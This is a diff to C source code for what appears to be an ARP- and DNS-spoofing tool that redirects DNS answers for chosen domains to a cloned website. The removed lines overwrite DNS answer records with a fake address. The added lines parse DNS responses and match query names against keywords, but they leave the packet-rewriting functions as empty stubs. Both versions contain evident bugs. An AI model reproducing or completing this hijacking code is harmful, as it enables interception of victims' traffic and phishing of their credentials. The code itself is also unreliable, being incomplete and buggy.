@@ -47,56 +47,56 @@ DWORD WINAPI start_arp_spoofing(LPVOID lparam)
 }
 
 /*
-* @purpose: Creates the actual fake DNS packet.
-* @params: packet - the packet to be changed.
-* @return: void.
+* @purpose: changes the answer section of the DNS packet.
+* @params:	packet - the packet to be changed.
+*			pAnswer - pointer to the answer section.
+*			pQue - pointer to the question string (response packet).
+* @return:	the pointer to the end of the function.
 * 
 */
-static void create_fake_dns_respones(u_char* packet)
+void* create_fake_dns_respones(u_char* const packet, void* const pAnswer, void* const pQuestion)
 {
 	/* locals */
-	dns_hdr* dns_header;
-	u_char* dns_data;
-	struct in_addr fake_addr;
-
-	dns_header = (dns_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr));
-	dns_data = (u_char*)(dns_header) + sizeof(dns_hdr);
-
-	for (size_t i = 0; i < dns_header->questions; i++)
-	{
-		for (;dns_data != '\0'; dns_data++);
-		dns_data += 5; // 2 type + 2 class + 1 next name.
-	}
 	
-	fake_addr.S_un.S_addr = fake_web;
-	for (size_t i = 0; i < dns_header->answers; i++)
-	{
-		dns_data += 12; // all dns answer byte length (Name(2), Type(2), Class(2), TTL(4), Data len(2))
-		strcpy(dns_data, inet_ntoa(fake_addr));
-	}
+
+
+	
 }
 
 /*
 * @purpose: Checks if a DNS packet is intended for the specific cloned website.
 * If so changes the packet for DNS hijacking.
 * @params: packet - the network packet
-* @return: void
+* @return: size of new packet (same size if not the DNS)
 * 
 */
-void dns_spoofing(u_char* packet)
+size_t dns_spoofing(u_char* packet, size_t packet_size)
 {
 	/* check if valid DNS packet */
+	ether_hdr* eth_header = (ether_hdr*)packet;
+	ip_hdr* ip_header = (ip_hdr*)(packet + sizeof(ether_hdr));
 	udp_hdr* udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));
-	if (udp_header->src_port != 53) // dns port
-		return;
+	uint16_t questions;
 
-	/* check if DNS query name matches the spoofed names */
-	char* query_name = (packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr) + sizeof(dns_hdr) + 1);
-	for (size_t i = 0; i < KEYWORD_SIZE; i++)
-		if (strcmp(query_name, keywords[i]) == 0)
-		{
-			/* change packet content DNS respones */
-			create_fake_dns_respones(packet);
-			break;
-		}
+	if (eth_header->frame_type != htons(NETWORK_IPv4) // ipv4
+		|| ip_header->protocol != TRANSPORT_UDP // udp port
+		|| udp_header->src_port != htons(53)) // dns port
+		return packet_size;
+	
+	dns_hdr* dns_header = (dns_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr));
+	u_char* dns_data = (u_char*)dns_header + sizeof(dns_hdr);
+	void* const temp_p = (void*)dns_data;
+	questions = htons(dns_header->questions);
+
+	for (size_t i = 0; i < questions; i++)
+	{
+		for (size_t key = 0; key < KEYWORD_SIZE; key++)
+			if (!strcmp(keywords[key], dns_data))
+			{
+				
+			}
+		dns_data += strlen(dns_data) + 5; // point to the next question
+	}
+	
+	
 }
